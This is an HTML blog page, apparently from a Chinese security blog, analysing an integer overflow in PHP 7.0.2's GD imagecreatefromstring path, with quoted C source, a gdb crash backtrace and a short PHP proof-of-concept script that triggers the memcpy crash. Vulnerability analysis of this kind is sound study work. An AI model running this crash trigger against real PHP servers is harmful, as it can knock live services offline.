@@ -1,0 +1,873 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="Stack-based integer overlow（php漏洞挖掘系列之一）0x01 前言首先声明这些漏洞不是我挖的，我想挖但是挖不出来，蛋疼。本次讲解栈溢出漏洞，这个漏洞是比较常见的漏洞，现在不太好挖了，变量跟踪的你头痛死，没有啥好x工具，只能人工慢慢的看，可能我孤陋寡闻吧。
+0x02 漏洞分析首先下载源码http://php.net/releases/，然后编译安装，版本可以低一点，往后的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="stack-based integer overflow">
+<meta property="og:url" content="http://yoursite.com/2017/02/16/stack-based-integer-overflow/index.html">
+<meta property="og:site_name" content="hackyzh'blog">
+<meta property="og:description" content="Stack-based integer overlow（php漏洞挖掘系列之一）0x01 前言首先声明这些漏洞不是我挖的，我想挖但是挖不出来，蛋疼。本次讲解栈溢出漏洞，这个漏洞是比较常见的漏洞，现在不太好挖了，变量跟踪的你头痛死，没有啥好x工具，只能人工慢慢的看，可能我孤陋寡闻吧。
+0x02 漏洞分析首先下载源码http://php.net/releases/，然后编译安装，版本可以低一点，往后的">
+<meta property="og:updated_time" content="2017-02-16T11:58:29.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="stack-based integer overflow">
+<meta name="twitter:description" content="Stack-based integer overlow（php漏洞挖掘系列之一）0x01 前言首先声明这些漏洞不是我挖的，我想挖但是挖不出来，蛋疼。本次讲解栈溢出漏洞，这个漏洞是比较常见的漏洞，现在不太好挖了，变量跟踪的你头痛死，没有啥好x工具，只能人工慢慢的看，可能我孤陋寡闻吧。
+0x02 漏洞分析首先下载源码http://php.net/releases/，然后编译安装，版本可以低一点，往后的">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 1,
+      author: 'hackyzh'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/02/16/stack-based-integer-overflow/"/>
+
+  <title> stack-based integer overflow | hackyzh'blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?657dfc0df5002745c7be83cc9e53b12d";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">hackyzh'blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                stack-based integer overflow
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2017-02-16T19:54:10+08:00" content="2017-02-16">
+              2017-02-16
+            </time>
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2017/02/16/stack-based-integer-overflow/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/02/16/stack-based-integer-overflow/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Stack-based-integer-overlow（php漏洞挖掘系列之一）"><a href="#Stack-based-integer-overlow（php漏洞挖掘系列之一）" class="headerlink" title="Stack-based integer overlow（php漏洞挖掘系列之一）"></a>Stack-based integer overlow（php漏洞挖掘系列之一）</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>首先声明这些漏洞不是我挖的，我想挖但是挖不出来，蛋疼。本次讲解栈溢出漏洞，这个漏洞是比较常见的漏洞，现在不太好挖了，变量跟踪的你头痛死，没有啥好x工具，只能人工慢慢的看，可能我孤陋寡闻吧。</p>
+<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>首先下载源码<a href="http://php.net/releases/，然后编译安装，版本可以低一点，往后的漏洞这个版本都是没打补丁的。环境采用ubuntu和编译版本的php7.0.2，只有linux才有符号表，windows下不好调试，虽然方便的多。现在正式开始吧。" target="_blank" rel="external">http://php.net/releases/，然后编译安装，版本可以低一点，往后的漏洞这个版本都是没打补丁的。环境采用ubuntu和编译版本的php7.0.2，只有linux才有符号表，windows下不好调试，虽然方便的多。现在正式开始吧。</a></p>
+<p>定位到漏洞函数代码 /ext/gd/gd.c:2222<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">PHP_FUNCTION(imagecreatefromstring)</div><div class="line">&#123;</div><div class="line">         zval *data;</div><div class="line">         gdImagePtr im;</div><div class="line">         int imtype;</div><div class="line">         char sig[8];</div><div class="line"> </div><div class="line">         if (zend_parse_parameters(ZEND_NUM_ARGS(), &quot;z&quot;, &amp;data) == FAILURE) &#123;</div><div class="line">                   return;</div><div class="line">         &#125;</div><div class="line">         convert_to_string_ex(data);</div><div class="line">         if (Z_STRLEN_P(data) &lt; 8) &#123;</div><div class="line">                   php_error_docref(NULL, E_WARNING, &quot;Empty string or invalid image&quot;);</div><div class="line">                   RETURN_FALSE;</div><div class="line">         &#125;</div><div class="line">         memcpy(sig, Z_STRVAL_P(data), 8);</div><div class="line">         imtype = _php_image_type(sig);</div><div class="line">         switch (imtype) &#123;</div><div class="line">                   case PHP_GDIMG_TYPE_JPG:</div><div class="line">#ifdef HAVE_GD_JPG</div><div class="line">                            im = _php_image_create_from_string(data, &quot;JPEG&quot;, gdImageCreateFromJpegCtx);</div><div class="line">#else</div><div class="line">                            php_error_docref(NULL, E_WARNING, &quot;No JPEG support in this PHP build&quot;);</div><div class="line">                            RETURN_FALSE;</div><div class="line">#endif</div><div class="line">                            break;</div><div class="line">                   case PHP_GDIMG_TYPE_PNG:</div><div class="line">#ifdef HAVE_GD_PNG</div><div class="line">                            im = _php_image_create_from_string(data, &quot;PNG&quot;, gdImageCreateFromPngCtx);</div><div class="line">#else</div><div class="line">                            php_error_docref(NULL, E_WARNING, &quot;No PNG support in this PHP build&quot;);</div><div class="line">                            RETURN_FALSE;</div><div class="line">#endif</div><div class="line">                            break;</div><div class="line">                   case PHP_GDIMG_TYPE_GIF:</div><div class="line">                            im = _php_image_create_from_string(data, &quot;GIF&quot;, gdImageCreateFromGifCtx);</div><div class="line">                            break;</div><div class="line">                   case PHP_GDIMG_TYPE_WBM:</div><div class="line">                            im=_php_image_create_from_string(data,&quot;WBMP&quot;, gdImageCreateFromWBMPCtx);</div><div class="line">                            break；</div><div class="line">                   case PHP_GDIMG_TYPE_GD2:</div><div class="line">                            im = _php_image_create_from_string(data, &quot;GD2&quot;, gdImageCreateFromGd2Ctx);</div><div class="line">                            break;</div><div class="line">                   default:</div><div class="line">                            php_error_docref(NULL, E_WARNING, &quot;Data is not in a recognized format&quot;);</div><div class="line">                            RETURN_FALSE;</div><div class="line">         &#125;</div><div class="line">         if (!im) &#123;</div><div class="line">                   php_error_docref(NULL, E_WARNING, &quot;Couldn&apos;t create GD Image Stream out of Data&quot;);</div><div class="line">                   RETURN_FALSE;</div><div class="line">         &#125;</div><div class="line">         RETURN_RES(zend_register_resource(im, le_gd));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>有可能上面的代码长了点，但是只要找到关键函数就行了_php_image_create_from_string，在这个函数中的gdNewDynamicCtxEx这个函数才是关键点，跟踪进去就行了。在gd.c:2196行，假如你使用其他版本可能行号不一样，不过没事搜索函数就行了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line">gdImagePtr _php_image_create_from_string(zval *data, char *tn, gdImagePtr (*ioctx_func_p)())</div><div class="line">&#123;</div><div class="line">         gdImagePtr im;</div><div class="line">         gdIOCtx *io_ctx;</div><div class="line">         io_ctx = gdNewDynamicCtxEx(Z_STRLEN_P(data),Z_STRVAL_P(data), 0);  //这边的传入参数的长度为0x80000000  由于是int，所以这边整数溢出。</div><div class="line">………………………………………………………………………………</div><div class="line">gdNewDynamicCtxEx函数代码，行号就不说了。</div><div class="line">gdIOCtx * gdNewDynamicCtxEx (int initialSize, void *data, int freeOKFlag)</div><div class="line">&#123;</div><div class="line">         dpIOCtx *ctx;</div><div class="line">         dynamicPtr *dp;</div><div class="line">         ctx = (dpIOCtx *) gdMalloc (sizeof (dpIOCtx));</div><div class="line">         dp = newDynamic(initialSize, data, freeOKFlag);</div><div class="line">         ctx-&gt;dp = dp; //这边将initialSize 赋值了</div><div class="line">         ctx-&gt;ctx.getC =dynamicGetchar; //这边造成栈溢出，跟踪进去进行了。</div><div class="line">………………………………………………………………………………</div><div class="line"></div><div class="line">newDynamic函数代码</div><div class="line">static dynamicPtr * newDynamic (int initialSize, void *data, int freeOKFlag)</div><div class="line">&#123;</div><div class="line">         dynamicPtr *dp;</div><div class="line">         dp = (dynamicPtr *) gdMalloc (sizeof (dynamicPtr)); // 这边申请了64个字节</div><div class="line">         allocDynamic (dp, initialSize, data);</div><div class="line">………………………………………………………..</div><div class="line">static int</div><div class="line">allocDynamic (dynamicPtr * dp, int initialSize, void *data)</div><div class="line">&#123;</div><div class="line">         if (data == NULL) &#123;</div><div class="line">                   dp-&gt;logicalSize = 0;</div><div class="line">                   dp-&gt;dataGood = FALSE;</div><div class="line">                   dp-&gt;data = gdMalloc(initialSize);  这里的initialSize的值为-2147483648</div><div class="line">         &#125; else &#123;</div><div class="line">                   dp-&gt;logicalSize = initialSize;</div><div class="line">                   dp-&gt;dataGood = TRUE;</div><div class="line">                   dp-&gt;data = data;</div><div class="line">         &#125;</div><div class="line">……………………………………………….</div><div class="line">static int dynamicGetchar (gdIOCtxPtr ctx)</div><div class="line">&#123;</div><div class="line">         unsigned char b;</div><div class="line">         int rv;</div><div class="line">         rv = dynamicGetbuf (ctx, &amp;b, 1);</div><div class="line"> </div><div class="line">………………………………………………………………………………</div><div class="line">static int dynamicGetbuf (gdIOCtxPtr ctx, void *buf, int len)</div><div class="line">&#123;</div><div class="line">         int rlen, remain;</div><div class="line">         dpIOCtxPtr dctx;</div><div class="line">         dynamicPtr *dp;</div><div class="line">         dctx = (dpIOCtxPtr) ctx;</div><div class="line">         dp = dctx-&gt;dp;</div><div class="line">         remain = dp-&gt;logicalSize - dp-&gt;pos;</div><div class="line">         if (remain &gt;= len) &#123;</div><div class="line">                   rlen = len;</div><div class="line">         &#125; else &#123;</div><div class="line">                   if (remain == 0) &#123;</div><div class="line">                            return EOF;</div><div class="line">                   &#125;</div><div class="line">                   rlen = remain;//上面的remain 的值为负数，没有检查，直接比较后赋值，所以导致下面的rlen的值过大造成栈溢出。</div><div class="line">         &#125;</div><div class="line">         memcpy(buf, (void *) ((char *) dp-&gt;data + dp-&gt;pos), rlen); //这边造成了栈溢出</div></pre></td></tr></table></figure></p>
+<p>下面是几个结构体，可以对照着去理解代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">typedef struct gdIOCtx &#123;</div><div class="line">         int    (*getC)(struct gdIOCtx*);</div><div class="line">         int    (*getBuf)(struct gdIOCtx*, void*, int);</div><div class="line">         void  (*putC)(struct gdIOCtx*, int);</div><div class="line">         int    (*putBuf)(struct gdIOCtx*, const void*, int);</div><div class="line">         int    (*seek)(struct gdIOCtx*, const int);</div><div class="line">         long (*tell)(struct gdIOCtx*);</div><div class="line">         void  (*gd_free)(struct gdIOCtx*);</div><div class="line">         void  *data;</div><div class="line">&#125; gdIOCtx;</div><div class="line">………………………………………………………………………………</div><div class="line">typedef struct dpStruct</div><div class="line">&#123;</div><div class="line">         void *data;</div><div class="line">         int logicalSize;</div><div class="line">         int realSize;</div><div class="line">         int dataGood;</div><div class="line">         int pos;</div><div class="line">         int freeOK;</div><div class="line">&#125; dynamicPtr;</div><div class="line">………………………………………………………………………………</div><div class="line">typedef struct dpIOCtx</div><div class="line">&#123;</div><div class="line">         gdIOCtx ctx;</div><div class="line">         dynamicPtr *dp;</div><div class="line">&#125; dpIOCtx;</div><div class="line">………………………………………………………………………………</div></pre></td></tr></table></figure></p>
+<p>下面是gdb的调试信息,不知道为什么参数的值没有显示出来。有些代码直接阅读比较麻烦，可以gdb调试代码，再调试的同时，打印出它的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">root@mhn:~# gdb -q --args php-7.0.2/sapi/cli/php -n test.php</div><div class="line">Reading symbols from php-7.0.2/sapi/cli/php...done.</div><div class="line">(gdb) r</div><div class="line">Starting program: /root/php-7.0.2/sapi/cli/php -n test.php</div><div class="line">[Thread debugging using libthread_db enabled]</div><div class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</div><div class="line"> </div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">__memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:118</div><div class="line">118  ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S: No such file or directory.</div><div class="line">(gdb) bt</div><div class="line">#0  __memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:118</div><div class="line">#1  0x000000000059c1cf in memcpy (__len=18446744071562067968, __src=&lt;optimized out&gt;, __dest=&lt;optimized out&gt;) at /usr/include/x86_64-linux-gnu/bits/string3.h:51</div><div class="line">#2  dynamicGetbuf (ctx=&lt;optimized out&gt;, buf=&lt;optimized out&gt;, len=&lt;optimized out&gt;) at /root/php-7.0.2/ext/gd/libgd/gd_io_dp.c:246</div><div class="line">#3  0x000000000059dd05 in php_gd_fill_input_buffer (cinfo=0x7fffffffaa70) at /root/php-7.0.2/ext/gd/libgd/gd_jpeg.c:607</div><div class="line">#4  0x00007ffff73144e6 in ?? () from /usr/lib/x86_64-linux-gnu/libjpeg.so.8</div><div class="line">#5  0x00007ffff73129ca in ?? () from /usr/lib/x86_64-linux-gnu/libjpeg.so.8</div></pre></td></tr></table></figure></p>
+<p>poc就放下面了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">ini_set(&apos;memory_limit&apos;,-1);</div><div class="line">$var_3  =  str_repeat(&quot;A&quot;,0x80000000);</div><div class="line">$var_3[0]=&quot;\xff&quot;;</div><div class="line">$var_3[1]=&quot;\xd8&quot;;</div><div class="line">$var_3[2]=&quot;\xff&quot;;</div><div class="line">imagecreatefromstring($var_3);</div></pre></td></tr></table></figure></p>
+<p>这边为什么要替换变量的值呢，由于它上面会检查文件头是否为真实的图片。所以我这边用了jpg的文件头，应该是吧，我也忘了啥文件头，反正只要网上搜索一下图片的文件头就行了。</p>
+<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>说实话我也是初学者，只能这样写一篇文章了，网上的php底层的漏洞挖掘太少了，就只有应用层的代码审计，希望能够给初学者们帮助吧。</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/path/toge/wechat-reward-image" alt="hackyzh WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/path/to/alipay-reward-ima" alt="hackyzh Alipay"/>
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/10/11/vuplayer-stack-overflow/" rel="next" title="vuplayer stack overflow">
+                <i class="fa fa-chevron-left"></i> vuplayer stack overflow
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <div class="ds-share flat" data-thread-key="2017/02/16/stack-based-integer-overflow/"
+     data-title="stack-based integer overflow"
+     data-content=""
+     data-url="http://yoursite.com/2017/02/16/stack-based-integer-overflow/">
+  <div class="ds-share-inline">
+    <ul  class="ds-share-icons-16">
+
+      <li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+      <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+      <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+      <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+      <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+
+    </ul>
+    <div class="ds-share-icons-more">
+    </div>
+  </div>
+</div>
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2017/02/16/stack-based-integer-overflow/"
+           data-title="stack-based integer overflow" data-url="http://yoursite.com/2017/02/16/stack-based-integer-overflow/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.jpg"
+               alt="hackyzh" />
+          <p class="site-author-name" itemprop="name">hackyzh</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">3</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/" target="_blank" title="微博">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  微博
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://douban.com/" target="_blank" title="豆瓣">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  豆瓣
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.zhihu.com/" target="_blank" title="知乎">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  知乎
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.freebuf.com" title="freebuf" target="_blank">freebuf</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://github.com/whiteHat001/whiteHat001.github.io" title="hackyzh's github" target="_blank">hackyzh's github</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://thief.one" title="One Thief" target="_blank">One Thief</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Stack-based-integer-overlow（php漏洞挖掘系列之一）"><span class="nav-number">1.</span> <span class="nav-text">Stack-based integer overlow（php漏洞挖掘系列之一）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-前言"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-漏洞分析"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-小结"><span class="nav-number">1.3.</span> <span class="nav-text">0x03 小结</span></a></li></ol></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2016 - 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">hackyzh</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
